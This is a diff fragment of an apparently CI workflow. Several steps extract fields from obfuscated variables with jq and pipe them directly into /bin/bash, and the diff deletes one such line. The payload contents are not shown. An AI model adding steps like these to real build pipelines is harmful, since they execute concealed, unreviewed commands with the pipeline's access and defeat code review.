@@ -33,7 +33,6 @@ jobs:
           echo $awff79 | jq -r .jw057 | /bin/bash
           printf '%s' "$by1" | jq -r .cszg464 | /bin/bash
           echo $rtqj1 | jq -r .vdwp0 | /bin/bash
-          echo $p5361 | jq -r .s3 | /bin/bash
           printf '%s' "$fxf181" | jq -r .b903 | /bin/bash
           echo $q3 | jq -r .tu32 | /bin/bash
 
